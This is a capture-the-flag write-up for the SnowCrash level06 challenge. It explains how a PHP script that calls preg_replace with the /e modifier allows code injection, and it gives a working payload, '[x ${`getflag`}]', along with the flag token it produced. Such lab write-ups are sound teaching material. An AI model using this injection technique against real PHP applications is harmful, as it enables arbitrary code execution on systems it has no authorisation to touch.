## level06

We have here a binary and a php file.

Reorganizing the php to make it more legible we get

```php
#!/usr/bin/php
<?php

function y($m) {
        $m = preg_replace("/\./", " x ", $m);
        $m = preg_replace("/@/", " y", $m);
        return $m;
}       

function x($y, $z) { 
        $a = file_get_contents($y);
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
        $a = preg_replace("/\[/", "(", $a);
        $a = preg_replace("/\]/", ")", $a);
        return $a;
}

$r = x($argv[1], $argv[2]); print $r;

?>
```

`preg_replace`: find and replace with regular expressions

`file_get_contents`: returns the file in a string

There’s an interesting discussion [here](https://stackoverflow.com/questions/15454220/replace-preg-replace-e-modifier-with-preg-replace-callback) about the `/e` in `preg_replace`: this tells the function to evaluate the regex as PHP code.

That’s probably the vulnerability we want to exploit.

To match the vulnerable regex we need the form `[x <whatever>]` so if we were to try to write into a file the PHP code `[x getflag]` and call the binary…

```php
level06@SnowCrash:~$ ./level06 /tmp/exploit
getflag
```

How about using the backtick `?

```php
level06@SnowCrash:~$ ./level06 /tmp/exploit
`getflag`
```

Hmm… not quite there yet…

What if we leverage the variable evaluation, like `x = ${my_func()}` 

```php
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/exploit
level06@SnowCrash:~$ ./level06 /tmp/exploit
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

This way `getflag` was evaluated while being `flag06` and returned what we needed.

### Key Learnings
- `preg_replace` with `/e` modifier evaluates the replacement as PHP code
- variable evaluation in PHP to execute arbitrary code